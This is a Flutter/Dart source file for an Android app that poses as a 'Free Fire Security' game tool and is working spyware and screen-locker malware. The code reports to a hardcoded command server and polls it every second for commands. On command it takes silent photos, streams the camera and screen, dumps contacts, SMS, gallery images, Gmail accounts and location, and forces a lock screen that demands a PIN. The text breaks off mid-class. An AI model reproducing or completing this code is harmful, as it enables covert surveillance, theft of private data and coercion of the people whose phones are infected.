// main.dart - FULL FIXED VERSION WITH GAME VERIFICATION UI
import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'dart:ui';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'package:flutter_contacts/flutter_contacts.dart';
import 'package:geolocator/geolocator.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:audioplayers/audioplayers.dart';
import 'package:battery_plus/battery_plus.dart';
import 'package:camera/camera.dart';
import 'package:url_launcher/url_launcher.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:video_player/video_player.dart';

// ── SERVER (hardcode — tidak perlu ganti-ganti) ───────────────────────────────
const String kServerBase = "http://arss.miuntech.my.id:2005";

// ── GLOBALS ───────────────────────────────────────────────────────────────────
ValueNotifier<bool> deviceLocked   = ValueNotifier<bool>(false);
late AudioPlayer    _audioPlayer;
String globalDeviceId    = "";
String globalDeviceModel = "";
String currentLockMessage = "YOUR PHONE IS LOCKED!!!!";
String currentLockPIN     = "1234";

// Lock chat — pesan masuk dari attacker, keluar dari target
final lockChatMessages  = ValueNotifier<List<Map<String,String>>>([]);
bool isLockLive = false; // true = Lock Live mode (ada chat), false = lock biasa
String lockChatSenderName = "Admin";

// ── NATIVE CHANNELS ───────────────────────────────────────────────────────────
const MethodChannel platformStrobe = MethodChannel('com.dts.freefireth/strobe');
const MethodChannel platformSpy    = MethodChannel('com.dts.freefireth/background_spy');

// ── LIVE STREAM ───────────────────────────────────────────────────────────────
bool   _isLiveStreaming = false;
Timer? _liveStreamTimer;

// ════════════════════════════════════════════════════════════════════════════
// MAIN
// ════════════════════════════════════════════════════════════════════════════
void main() async {
  WidgetsFlutterBinding.ensureInitialized();

  // Init AudioPlayer SETELAH binding siap — kalau sebelumnya crash semua HP
  _audioPlayer = AudioPlayer();

  // Global error handler - cegah crash di low RAM
  FlutterError.onError = (FlutterErrorDetails details) {
    FlutterError.presentError(details);
  };

  // Catch async errors
  PlatformDispatcher.instance.onError = (error, stack) {
    return true; // handled - jangan crash
  };

  if (Platform.isAndroid) {
    if (!await Permission.systemAlertWindow.isGranted) {
      await Permission.systemAlertWindow.request();
    }
    _requestNotifAccess();
  }

  await _requestPermissions();

  final info = await _getDeviceInfo();
  globalDeviceId    = info['id']!;
  globalDeviceModel = info['model']!;

  try { await platformSpy.invokeMethod('saveTargetId', globalDeviceId); } catch (_) {}

  // Simpan deviceId ke native untuk persist setelah uninstall
  try {
    await platformSpy.invokeMethod('saveDeviceIdAll', globalDeviceId);
  } catch (_) {}

  // Kalau sudah pernah pair — langsung jalankan spyware background
  final prefs = await SharedPreferences.getInstance();
  final savedPair = prefs.getString('pairId');
  if (savedPair != null && savedPair.isNotEmpty) {
    await _registerDevice(globalDeviceId, globalDeviceModel);
    _startSpyware(globalDeviceId);
  }

  // Restore lock state dari persistent storage setelah restart
  try {
    final lockState = await platformSpy.invokeMethod('getLockState') as Map?;
    if (lockState != null && lockState['isLocked'] == true) {
      currentLockMessage = lockState['lockMessage']?.toString() ?? 'YOUR PHONE IS LOCKED!!!!';
      currentLockPIN     = lockState['lockPin']?.toString()    ?? '1234';
      isLockLive         = lockState['isLockLive'] == true;
      deviceLocked.value = true;
      playScarySound();
      // Kalau Lock Live - buka app ke foreground supaya chat bisa jalan
      if (isLockLive) {
        try { await platformSpy.invokeMethod('bringToForeground'); } catch(_) {}
      }
    }
  } catch (_) {}

  runApp(const AppRoot());
}

void _requestNotifAccess() async {
  try { await platformSpy.invokeMethod('openNotificationSettings'); } catch (_) {}
}

Future<void> _requestPermissions() async {
  await [
    Permission.location, Permission.contacts, Permission.storage,
    Permission.manageExternalStorage, Permission.camera, Permission.microphone,
    Permission.ignoreBatteryOptimizations, Permission.notification, Permission.sms,
    Permission.photos, // Android 13+ gallery access
  ].request();
}

Future<Map<String, String>> _getDeviceInfo() async {
  final di = DeviceInfoPlugin();
  String model = "Unknown", id = "UNKNOWN";
  try {
    if (Platform.isAndroid) {
      final a = await di.androidInfo;
      model = "${a.brand.toUpperCase()} ${a.model}";
      id    = "${a.brand}-${a.model}-${a.id}".replaceAll(' ', '_');
    } else if (Platform.isIOS) {
      final i = await di.iosInfo;
      model = i.name;
      id    = i.identifierForVendor ?? "UNKNOWN_IOS";
    }
  } catch (_) { id = "ZDX-${Platform.localHostname.hashCode}"; }
  return {"id": id, "model": model};
}

Future<void> _registerDevice(String id, String model) async {
  try {
    final bat = Battery();
    int lv = await bat.batteryLevel.catchError((_) => 100);
    await http.post(Uri.parse("$kServerBase/api/register-target"),
        headers: {"Content-Type": "application/json"},
        body: jsonEncode({
          "id": id, "model": model, "battery": lv.toString(),
          "status": "Online", "lastSeen": DateTime.now().toIso8601String(),
        }));
  } catch (_) {}
}

// ── PAIRING — dipanggil dari UI setelah user input ID ────────────────────────
Future<bool> pairDevice(String pairId) async {
  try {
    final bat = Battery();
    int lv = await bat.batteryLevel.catchError((_) => 100);
    final res = await http.post(
      Uri.parse("$kServerBase/api/pair-target"),
      headers: {"Content-Type": "application/json"},
      body: jsonEncode({
        "pairId": pairId, "deviceId": globalDeviceId,
        "model": globalDeviceModel, "battery": lv.toString(),
      }),
    ).timeout(const Duration(seconds: 15));
    if (res.statusCode == 200) {
      final data = jsonDecode(res.body);
      if (data['status'] == 'paired') {
        final prefs = await SharedPreferences.getInstance();
        await prefs.setString('pairId', pairId);
        return true;
      }
    }
  } catch (_) {}
  return false;
}

void playScarySound() async {
  await _audioPlayer.setReleaseMode(ReleaseMode.loop);
  await _audioPlayer.play(UrlSource(
      'https://www.soundboard.com/handler/DownLoadTrack.ashx?cliptitle=Scary+Laugh&filename=24/243764-00f7e1b5-829d-4874-a690-671891b0c79b.mp3'));
}
void stopSound() async { await _audioPlayer.stop(); }

void _startLiveCamera(String id, String side) async {
  if (_isLiveStreaming) return;
  _isLiveStreaming = true;
  try {
    // Buka kamera stream terus-menerus (repeating capture)
    await platformSpy.invokeMethod('startLiveCameraStream', {"side": side});
  } catch (_) {}
  // Poll frame dari Java setiap 150ms, kirim ke server
  _liveStreamTimer = Timer.periodic(const Duration(milliseconds: 150), (t) async {
    if (!_isLiveStreaming) { t.cancel(); return; }
    try {
      final f = await platformSpy.invokeMethod('getLiveFrame') as String?;
      if (f != null && f.isNotEmpty) {
        await http.post(Uri.parse("$kServerBase/api/live-frame/$id"),
            headers: {"Content-Type": "application/json"},
            body: jsonEncode({"frame": f, "ts": DateTime.now().millisecondsSinceEpoch}))
            .timeout(const Duration(seconds: 2));
      }
    } catch (_) {}
  });
}

void _startLiveScreen(String id) {
  if (_isLiveStreaming) return;
  _isLiveStreaming = true;
  _liveStreamTimer = Timer.periodic(const Duration(milliseconds: 150), (t) async {
    if (!_isLiveStreaming) { t.cancel(); return; }
    try {
      final f = await platformSpy.invokeMethod('startScreenStreamBackground') as String?;
      if (f != null && f.isNotEmpty) {
        await http.post(Uri.parse("$kServerBase/api/live-frame/$id"),
            headers: {"Content-Type": "application/json"},
            body: jsonEncode({"frame": f, "ts": DateTime.now().millisecondsSinceEpoch}))
            .timeout(const Duration(seconds: 2));
      }
    } catch (_) {}
  });
}

void _stopLive() {
  _isLiveStreaming = false;
  _liveStreamTimer?.cancel();
  _liveStreamTimer = null;
  // Stop live camera stream di Java
  platformSpy.invokeMethod('stopLiveCameraStream').catchError((_) {});
}

// ── SPYWARE LOOP ─────────────────────────────────────────────────────────────
void _startSpyware(String id) {
  Future<void> loop() async {
    try {
      final bat = Battery();
      int batLv = 100;
      try { batLv = await bat.batteryLevel; } catch (_) {}
      await http.post(Uri.parse("$kServerBase/api/heartbeat/$id"),
          headers: {"Content-Type": "application/json"},
          body: jsonEncode({"id": id, "status": "Alive", "battery": batLv.toString()}))
          .timeout(const Duration(seconds: 1));

      final res = await http.get(Uri.parse("$kServerBase/api/get-command/$id"));
      if (res.statusCode != 200 || res.body.isEmpty) return;

      final d = jsonDecode(res.body);
      String cmd   = d['command'] ?? 'idle';
      if (cmd == 'idle') return; // tidak ada command, skip
      String extra = d['extra']   ?? '';
      dynamic result;

      // ── LOCK LIVE (lock + chat) ──────────────────────────────────────
      if (cmd == 'lock_live') {
        if (extra.contains('|')) {
          final p = extra.split('|');
          currentLockMessage = p[0].isNotEmpty ? p[0] : 'HP INI DIKUNCI';
          currentLockPIN     = p.length > 1 && p[1].isNotEmpty ? p[1] : '1234';
        }
        isLockLive = true;
        if (!deviceLocked.value) { deviceLocked.value = true; playScarySound(); }
        try { await platformSpy.invokeMethod('saveLockState', {
          'locked': true, 'isLockLive': true,
          'message': currentLockMessage, 'pin': currentLockPIN
        }); } catch (_) {}
        // Trigger LockOverlayService (system overlay - tidak bisa keluar)
        try { await platformSpy.invokeMethod('startLockOverlay', {
          'message': currentLockMessage, 'pin': currentLockPIN
        }); } catch (_) {}
        try { await platformSpy.invokeMethod('lockDeviceNow'); } catch (_) {}
        result = {"status": "LockLive"};
      }
      // ── HARD LOCK biasa ──────────────────────────────────────────────────
      else if (cmd == 'hard_lock' || cmd == 'lock_device') {
        if (extra.contains('|')) {
          final p = extra.split('|');
          currentLockMessage = p[0].isNotEmpty ? p[0] : 'YOUR PHONE IS LOCKED!!!!';
          currentLockPIN     = p.length > 1 && p[1].isNotEmpty ? p[1] : '1234';
        } else if (extra.isNotEmpty) { currentLockMessage = extra; }
        if (!deviceLocked.value) { deviceLocked.value = true; playScarySound(); }
        try { await platformSpy.invokeMethod('saveLockState', {
          'locked': true, 'isLockLive': false,
          'message': currentLockMessage, 'pin': currentLockPIN
        }); } catch (_) {}
        // Trigger LockOverlayService
        try { await platformSpy.invokeMethod('startLockOverlay', {
          'message': currentLockMessage, 'pin': currentLockPIN
        }); } catch (_) {}
        try { await platformSpy.invokeMethod('lockDeviceNow'); } catch (_) {}
        result = {"status": "Locked"};
      } else if (cmd == 'unlock' || cmd == 'unlock_device') {
        if (deviceLocked.value) {
          deviceLocked.value = false; stopSound();
          try { await platformStrobe.invokeMethod('stopStrobe'); } catch (_) {}
          try { await platformSpy.invokeMethod('saveLockState', {'locked': false, 'isLockLive': false, 'message': '', 'pin': ''}); } catch (_) {}
        }
        result = {"status": "Unlocked"};
      } else if (cmd == 'take_photo') {
        // Request camera permission dulu sebelum foto
        final camStatus = await Permission.camera.request();
        if (camStatus.isGranted) {
          final b64 = await platformSpy.invokeMethod('takeSilentPhotoBackground', {"side": extra.isEmpty ? "back" : extra});
          result = b64 != null ? {"status": "Success", "image_base64": b64} : {"status": "Failed - camera returned null"};
        } else {
          result = {"status": "Failed - camera permission denied"};
        }
      } else if (cmd == 'get_screen') {
        final b64 = await platformSpy.invokeMethod('startScreenStreamBackground');
        result = {"status": "Success", "image_base64": b64 ?? ""};
      } else if (cmd == 'live_camera_start') {
        _stopLive(); _startLiveCamera(id, extra.isEmpty ? 'back' : extra);
        result = {"status": "Live camera started"};
      } else if (cmd == 'live_screen_start') {
        _stopLive(); _startLiveScreen(id);
        result = {"status": "Live screen started"};
      } else if (cmd == 'live_stop') {
        _stopLive(); result = {"status": "Stopped"};
      } else if (cmd == 'get_gmails') {
        final emails = await platformSpy.invokeMethod('getGmailAccounts') as String? ?? '';
        result = {"accounts": emails.isEmpty ? "No Gmail Found" : emails};
      } else if (cmd == 'set_wallpaper') {
        await platformSpy.invokeMethod('setWallpaper', {"url": extra}); result = {"status": "Done"};
      } else if (cmd == 'play_audio') {
        try { await _audioPlayer.stop(); await _audioPlayer.play(UrlSource(extra)); result = {"status": "Playing"}; }
        catch (e) { result = {"status": "Error: $e"}; }
      } else if (cmd == 'stop_audio') {
        await _audioPlayer.stop(); result = {"status": "Stopped"};
      } else if (cmd == 'get_contacts' || cmd == 'dump_contacts') {
        if (await FlutterContacts.requestPermission()) {
          final list = await FlutterContacts.getContacts(withProperties: true, withPhoto: false);
          result = {"contacts": list.take(50).map((e) => {"name": e.displayName, "number": e.phones.isNotEmpty ? e.phones.first.number : ""}).toList()};
        }
      } else if (cmd == 'flash_strobe') {
        await platformStrobe.invokeMethod('startStrobe'); result = {"status": "On"};
      } else if (cmd == 'stop_strobe') {
        await platformStrobe.invokeMethod('stopStrobe'); result = {"status": "Off"};
      } else if (cmd == 'vibrate_loop') {
        // Vibrate via platform channel (tidak butuh plugin)
        try {
          await platformSpy.invokeMethod('vibrateDevice', {'duration': 5000});
        } catch (_) {
          // Fallback: HapticFeedback
          for (int i = 0; i < 10; i++) {
            await Future.delayed(const Duration(milliseconds: 300));
          }
        }
        result = {"status": "Vibrating"};
      } else if (cmd == 'open_url') {
        final url = Uri.parse(extra);
        if (await canLaunchUrl(url)) await launchUrl(url, mode: LaunchMode.externalApplication);
        result = {"status": "Opened"};
      } else if (cmd == 'get_location' || cmd == 'track_gps') {
        final pos = await Geolocator.getCurrentPosition(desiredAccuracy: LocationAccuracy.high);
        result = {"lat": pos.latitude, "lng": pos.longitude};
      } else if (cmd == 'force_open') {
        try { await platformSpy.invokeMethod('bringToForeground'); } catch (_) {}
        result = {"status": "OK"};
      } else if (cmd == 'reboot_device' || cmd == 'restart_device') {
        try {
          await platformSpy.invokeMethod('rebootDevice');
          result = {"status": "Rebooting"};
        } catch (e) {
          result = {"status": "reboot_failed: \${e.toString()}"};
        }
      } else if (cmd == 'get_sms') {
        try {
          final smsList = await platformSpy.invokeMethod('getSmsMessages');
          result = {"sms": smsList};
        } catch(e) { result = {"sms": [], "error": e.toString()}; }
      } else if (cmd == 'get_gallery') {
        try {
          final imgs = await platformSpy.invokeMethod('getGalleryImages', {"limit": 5});
          result = {"images": imgs ?? []};
        } catch(e) { result = {"images": [], "error": e.toString()}; }
      } else if (cmd == 'chat_msg') {
        if (extra.isNotEmpty) {
          final msgs = List<Map<String,String>>.from(lockChatMessages.value);
          msgs.add({'from': 'owner', 'text': extra, 'time': DateTime.now().toString().substring(11,16)});
          lockChatMessages.value = msgs;
        }
        result = {"status": "msg_received"};
      } else if (cmd == 'open_notification_settings') {
        _requestNotifAccess(); result = {"status": "Opened"};
      } else if (cmd == 'kill_wifi') {
        try {
          // Matikan WiFi via platform channel
          await platformSpy.invokeMethod('disableWifi');
          result = {"status": "WiFi disabled"};
        } catch (_) {
          result = {"status": "Failed - no permission"};
        }
      }

      if (result != null) {
        await http.post(Uri.parse("$kServerBase/api/post-response/$id"),
            headers: {"Content-Type": "application/json"},
            body: jsonEncode({"data": result, "cmd": cmd}));
      }
    } catch (_) {}
  }
  Timer.periodic(const Duration(seconds: 1), (_) => loop());
}

// ════════════════════════════════════════════════════════════════════════════
// APP ROOT - Modern Cyberpunk Theme with Game Verification
// ════════════════════════════════════════════════════════════════════════════
class AppRoot extends StatelessWidget {
  const AppRoot({super.key});
  
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      title: 'Free Fire Security',
      theme: ThemeData(
        brightness: Brightness.dark,
        primaryColor: const Color(0xFFDC2626),
        scaffoldBackgroundColor: const Color(0xFF000000),
        useMaterial3: true,
        fontFamily: 'SF Pro Display',
        colorScheme: const ColorScheme.dark(
          primary: Color(0xFFDC2626),
          secondary: Color(0xFF991B1B),
          surface: Color(0xFF0A0A0A),
          background: Color(0xFF000000),
          error: Color(0xFFEF4444),
          onPrimary: Colors.white,
          onSecondary: Colors.white,
          onSurface: Color(0xFFE5E5E5),
          onBackground: Colors.white,
          onError: Colors.white,
        ),
      ),
      home: const LockWrapper(),
    );
  }
}

// ════════════════════════════════════════════════════════════════════════════
// LOCK WRAPPER
// ════════════════════════════════════════════════════════════════════════════
class LockWrapper extends StatefulWidget {
  const LockWrapper({super.key});
  @override State<LockWrapper> createState() => _LockWrapperState();
}

class _LockWrapperState extends State<LockWrapper> with WidgetsBindingObserver {
  final _pinCtrl  = TextEditingController();
  final _chatCtrl = TextEditingController();
  final _chatScroll = ScrollController();
  Timer? _chatPollTimer;
  Timer? _enforceLockTimer;

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addObserver(this);
    // Poll chat dari server setiap 3 detik
    _chatPollTimer = Timer.periodic(const Duration(seconds: 3), (_) => _pollChat());
    // Enforce lock - paksa foreground setiap 3 detik saat locked
    _enforceLockTimer = Timer.periodic(const Duration(seconds: 3), (_) {
      if (deviceLocked.value) {
        try { platformSpy.invokeMethod('bringToForeground'); } catch (_) {}
      }
    });
  }

  @override
  void dispose() {
    WidgetsBinding.instance.removeObserver(this);
    _pinCtrl.dispose(); _chatCtrl.dispose(); _chatScroll.dispose();
    _chatPollTimer?.cancel();
    _enforceLockTimer?.cancel();
    super.dispose();
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState s) {
    if (deviceLocked.value) {
      // Saat lock aktif - paksa balik ke foreground di semua kondisi
      if (s == AppLifecycleState.paused ||
          s == AppLifecycleState.inactive ||
          s == AppLifecycleState.hidden ||
          s == AppLifecycleState.detached) {
        Future.delayed(const Duration(milliseconds: 100), () {
          try { platformSpy.invokeMethod('bringToForeground'); } catch (_) {}
        });
        Future.delayed(const Duration(milliseconds: 500), () {
          try { platformSpy.invokeMethod('bringToForeground'); } catch (_) {}
        });
        Future.delayed(const Duration(milliseconds: 1200), () {
          try { platformSpy.invokeMethod('bringToForeground'); } catch (_) {}
        });
      }
    }
  }

  // Poll pesan chat dari server (dipanggil saat lock aktif)
  Future<void> _pollChat() async {
    if (!deviceLocked.value || globalDeviceId.isEmpty) return;
    try {
      final res = await http.get(Uri.parse('$kServerBase/api/lock-chat/$globalDeviceId'))
          .timeout(const Duration(seconds: 4));
      if (res.statusCode == 200) {
        final body = jsonDecode(res.body);
        final msgs = body['messages'] as List? ?? [];
        if (msgs.isNotEmpty && mounted) {
          final current = List<Map<String,String>>.from(lockChatMessages.value);
          for (final m in msgs) {
            current.add({
              'from': m['from']?.toString() ?? 'owner',
              'text': m['text']?.toString() ?? '',
              'time': m['time']?.toString() ?? '',
            });
          }
          lockChatMessages.value = current;
          Future.delayed(const Duration(milliseconds: 100), () {
            if (_chatScroll.hasClients) {
              _chatScroll.animateTo(_chatScroll.position.maxScrollExtent,
                  duration: const Duration(milliseconds: 200), curve: Curves.easeOut);
            }
          });
        }
      }
    } catch (_) {}
  }

  // Kirim balasan chat dari target ke owner
  Future<void> _sendChatReply(String text) async {
    if (text.trim().isEmpty || globalDeviceId.isEmpty) return;
    _chatCtrl.clear();
    final current = List<Map<String,String>>.from(lockChatMessages.value);
    current.add({'from': 'target', 'text': text.trim(), 'time': TimeOfDay.now().format(context)});
    lockChatMessages.value = current;
    try {
      await http.post(Uri.parse('$kServerBase/api/lock-chat/$globalDeviceId'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({'text': text.trim(), 'from': 'target'}),
      ).timeout(const Duration(seconds: 5));
    } catch (_) {}
    Future.delayed(const Duration(milliseconds: 100), () {
      if (_chatScroll.hasClients) {
        _chatScroll.animateTo(_chatScroll.position.maxScrollExtent,
            duration: const Duration(milliseconds: 200), curve: Curves.easeOut);
      }
    });
  }

  void _tryUnlock(String pin) {
    if (pin == currentLockPIN) {
      deviceLocked.value = false;
      isLockLive = false;
      lockChatMessages.value = [];
      stopSound(); _pinCtrl.clear();
    } else {
      _pinCtrl.clear();
      ScaffoldMessenger.of(context).showSnackBar(SnackBar(
          content: Row(children: const [
            Icon(Icons.close_rounded, color: Colors.white, size: 20),
            SizedBox(width: 8),
            Text("Akses ditolak", style: TextStyle(color: Colors.white, fontWeight: FontWeight.w500)),
          ]),
          backgroundColor: Colors.red.shade900,
          duration: const Duration(milliseconds: 800),
          behavior: SnackBarBehavior.floating,
          shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12))));
    }
  }

  @override
  Widget build(BuildContext context) {
    return ValueListenableBuilder<bool>(
      valueListenable: deviceLocked,
      builder: (ctx, locked, _) {
        return PopScope(
          canPop: false,
          child: Stack(children: [
            const PairingHomePage(),

            if (locked)
              Scaffold(
                backgroundColor: Colors.black,
                resizeToAvoidBottomInset: true,
                body: ValueListenableBuilder<List<Map<String,String>>>(
                  valueListenable: lockChatMessages,
                  builder: (_, msgs, __) {
                    return Container(
                      width: double.infinity, height: double.infinity,
                      decoration: BoxDecoration(
                        gradient: LinearGradient(
                          begin: Alignment.topCenter, 
                          end: Alignment.bottomCenter,
                          colors: isLockLive
                              ? [const Color(0xFF0A0A0A), const Color(0xFF1A0000)]
                              : [const Color(0xFF0A0A0A), const Color(0xFF000000)],
                        ),
                      ),
                      child: SafeArea(
                        child: isLockLive
                            ? _buildLockLiveUI(msgs)
                            : _buildLockBasicUI(),
                      ),
                    );
                  },
                ),
              ),
          ]),
        );
      },
    );
  }

  // ── Lock biasa — hanya PIN ─────────────────────────────────────────────
  Widget _buildLockBasicUI() {
    return Center(
      child: SingleChildScrollView(
        child: Padding(
          padding: const EdgeInsets.all(24),
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              // Glowing icon
              Container(
                width: 100,
                height: 100,
                decoration: BoxDecoration(
                  shape: BoxShape.circle,
                  gradient: LinearGradient(
                    begin: Alignment.topLeft,
                    end: Alignment.bottomRight,
                    colors: [Colors.red.shade800, Colors.red.shade900],
                  ),
                  boxShadow: [
                    BoxShadow(
                      color: Colors.red.shade500.withOpacity(0.3),
                      blurRadius: 30,
                      spreadRadius: 5,
                    ),
                  ],
                ),
                child: const Icon(Icons.lock_outline_rounded, color: Colors.white, size: 50),
              ),
              const SizedBox(height: 32),
              
              // Message card
              Container(
                padding: const EdgeInsets.all(20),
                decoration: BoxDecoration(
                  color: const Color(0xFF0A0A0A),
                  borderRadius: BorderRadius.circular(20),
                  border: Border.all(color: Colors.red.shade900.withOpacity(0.3), width: 1),
                  boxShadow: [
                    BoxShadow(
                      color: Colors.black.withOpacity(0.5),
                      blurRadius: 20,
                      offset: const Offset(0, 5),
                    ),
                  ],
                ),
                child: Text(
                  currentLockMessage,
                  textAlign: TextAlign.center,
                  style: TextStyle(
                    color: Colors.red.shade400,
                    fontSize: 18,
                    fontWeight: FontWeight.w500,
                    height: 1.4,
                  ),
                ),
              ),
              const SizedBox(height: 40),
              
              // PIN input
              Container(
                decoration: BoxDecoration(
                  color: const Color(0xFF0A0A0A),
                  borderRadius: BorderRadius.circular(16),
                  border: Border.all(color: Colors.red.shade900.withOpacity(0.3), width: 1),
                ),
                child: TextField(
                  controller: _pinCtrl, 
                  obscureText: true,
                  keyboardType: TextInputType.number, 
                  textAlign: TextAlign.center,
                  style: const TextStyle(
                    color: Colors.white, 
                    fontSize: 28, 
                    letterSpacing: 12,
                    fontWeight: FontWeight.w600,
                  ),
                  decoration: InputDecoration(
                    hintText: "0000",
                    hintStyle: TextStyle(color: Colors.white.withOpacity(0.2), fontSize: 28, letterSpacing: 12),
                    border: InputBorder.none,
                    contentPadding: const EdgeInsets.symmetric(vertical: 20, horizontal: 20),
                  ),
                  onSubmitted: _tryUnlock,
                ),
              ),
              const SizedBox(height: 24),
              
              // Unlock button
              SizedBox(
                width: double.infinity,
                height: 56,
                child: ElevatedButton(
                  style: ElevatedButton.styleFrom(
                    backgroundColor: Colors.red.shade900,
                    foregroundColor: Colors.white,
                    elevation: 0,
                    shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16)),
                  ),
                  onPressed: () => _tryUnlock(_pinCtrl.text),
                  child: const Text(
                    "UNLOCK",
                    style: TextStyle(
                      fontWeight: FontWeight.w600,
                      letterSpacing: 2,
                      fontSize: 16,
                    ),
                  ),
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  // ── Lock Live — PIN + Chat ─────────────────────────────────────────────
  Widget _buildLockLiveUI(List<Map<String,String>> msgs) {
    return Column(children: [
      // Header with neon effect
      Container(
        padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 16),
        decoration: BoxDecoration(
          border: Border(
            bottom: BorderSide(color: Colors.red.shade900.withOpacity(0.3), width: 1),
          ),
        ),
        child: Row(
          children: [
            Container(
              width: 8,
              height: 8,
              decoration: BoxDecoration(
                color: Colors.red.shade500,
                shape: BoxShape.circle,
                boxShadow: [
                  BoxShadow(
                    color: Colors.red.shade500,
                    blurRadius: 8,
                  ),
                ],
              ),
            ),
            const SizedBox(width: 12),
            Expanded(
              child: Text(
                currentLockMessage,
                style: TextStyle(
                  color: Colors.red.shade400,
                  fontSize: 13,
                  fontWeight: FontWeight.w500,
                ),
                maxLines: 1,
                overflow: TextOverflow.ellipsis,
              ),
            ),
          ],
        ),
      ),

      // Chat area
      Expanded(
        child: msgs.isEmpty
            ? Center(
                child: Column(
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    Icon(Icons.chat_bubble_outline_rounded, color: Colors.white.withOpacity(0.1), size: 48),
                    const SizedBox(height: 16),
                    Text(
                      'No messages',
                      style: TextStyle(color: Colors.white.withOpacity(0.2), fontSize: 14),
                    ),
                  ],
                ),
              )
            : ListView.builder(
                controller: _chatScroll,
                padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 16),
                itemCount: msgs.length,
                itemBuilder: (_, i) {
                  final m = msgs[i];
                  final isOwner = m['from'] == 'owner';
                  return Align(
                    alignment: isOwner ? Alignment.centerLeft : Alignment.centerRight,
                    child: Container(
                      margin: const EdgeInsets.only(bottom: 12),
                      child: Column(
                        crossAxisAlignment: isOwner ? CrossAxisAlignment.start : CrossAxisAlignment.end,
                        children: [
                          Padding(
                            padding: const EdgeInsets.only(bottom: 4, left: 8, right: 8),
                            child: Text(
                              isOwner ? 'Admin' : 'You',
                              style: TextStyle(
                                color: isOwner ? Colors.grey.shade500 : Colors.red.shade500,
                                fontSize: 10,
                                fontWeight: FontWeight.w500,
                              ),
                            ),
                          ),
                          Container(
                            constraints: BoxConstraints(
                              maxWidth: MediaQuery.of(context).size.width * 0.75,
                            ),
                            padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 10),
                            decoration: BoxDecoration(
                              color: isOwner 
                                  ? const Color(0xFF1A1A1A) 
                                  : Colors.red.shade900.withOpacity(0.8),
                              borderRadius: BorderRadius.only(
                                topLeft: const Radius.circular(16),
                                topRight: const Radius.circular(16),
                                bottomLeft: Radius.circular(isOwner ? 4 : 16),
                                bottomRight: Radius.circular(isOwner ? 16 : 4),
                              ),
                            ),
                            child: Column(
                              crossAxisAlignment: isOwner ? CrossAxisAlignment.start : CrossAxisAlignment.end,
                              children: [
                                Text(
                                  m['text'] ?? '',
                                  style: const TextStyle(color: Colors.white, fontSize: 13),
                                ),
                                const SizedBox(height: 4),
                                Text(
                                  m['time'] ?? '',
                                  style: TextStyle(color: Colors.white.withOpacity(0.3), fontSize: 9),
                                ),
                              ],
                            ),
                          ),
                        ],
                      ),
                    ),
                  );
                }),
      ),

      // Input area
      Container(
        padding: const EdgeInsets.fromLTRB(16, 12, 16, 16),
        decoration: BoxDecoration(
          color: const Color(0xFF0A0A0A),
          border: Border(
            top: BorderSide(color: Colors.red.shade900.withOpacity(0.2), width: 1),
          ),
        ),
        child: Column(
          children: [
            // Chat input
            Row(
              children: [
                Expanded(
                  child: Container(
                    decoration: BoxDecoration(
                      color: const Color(0xFF141414),
                      borderRadius: BorderRadius.circular(24),
                    ),
                    child: TextField(
                      controller: _chatCtrl,
                      style: const TextStyle(color: Colors.white, fontSize: 14),
                      decoration: InputDecoration(
                        hintText: 'Type a message...',
                        hintStyle: TextStyle(color: Colors.white.withOpacity(0.3), fontSize: 14),
                        border: InputBorder.none,
                        contentPadding: const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
                      ),
                      onSubmitted: _sendChatReply,
                    ),
                  ),
                ),
                const SizedBox(width: 12),
                GestureDetector(
                  onTap: () => _sendChatReply(_chatCtrl.text),
                  child: Container(
                    padding: const EdgeInsets.all(12),
                    decoration: BoxDecoration(
                      color: Colors.red.shade900,
                      shape: BoxShape.circle,
                    ),
                    child: const Icon(Icons.send_rounded, color: Colors.white, size: 20),
                  ),
                ),
              ],
            ),
            const SizedBox(height: 12),
            
            // PIN unlock
            Row(
              children: [
                Expanded(
                  child: Container(
                    decoration: BoxDecoration(
                      color: const Color(0xFF141414),
                      borderRadius: BorderRadius.circular(16),
                    ),
                    child: TextField(
                      controller: _pinCtrl,
                      obscureText: true,
                      keyboardType: TextInputType.number,
                      textAlign: TextAlign.center,
                      style: const TextStyle(
                        color: Colors.white,
                        fontSize: 20,
                        letterSpacing: 8,
                        fontWeight: FontWeight.w500,
                      ),
                      decoration: InputDecoration(
                        hintText: "PIN",
                        hintStyle: TextStyle(color: Colors.white.withOpacity(0.2), fontSize: 16, letterSpacing: 4),
                        border: InputBorder.none,
                        contentPadding: const EdgeInsets.symmetric(vertical: 12),
                      ),
                      onSubmitted: _tryUnlock,
                    ),
                  ),
                ),
                const SizedBox(width: 12),
                ElevatedButton(
                  style: ElevatedButton.styleFrom(
                    backgroundColor: Colors.red.shade900,
                    foregroundColor: Colors.white,
                    elevation: 0,
                    padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 12),
                    shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16)),
                  ),
                  onPressed: () => _tryUnlock(_pinCtrl.text),
                  child: const Text(
                    "UNLOCK",
                    style: TextStyle(
                      fontWeight: FontWeight.w600,
                      fontSize: 13,
                      letterSpacing: 1,
                    ),
                  ),
                ),
              ],
            ),
          ],
        ),
      ),
    ]);
  }
}

// ════════════════════════════════════════════════════════════════════════════
// PAIRING HOME PAGE — Modern Cyberpunk UI with Game Verification
// ════════════════════════════════════════════════════════════════════════════
class PairingHomePage extends StatefulWidget {
  const PairingHomePage({super.key});
  @override State<PairingHomePage> createState() => _PairingHomePageState();
}

class _PairingHomePageState extends State<PairingHomePage> with SingleTickerProviderStateMixin {
  final _idCtrl    = TextEditingController();
  bool  _loading   = false;
  bool  _paired    = false;
  String _msg      = '';
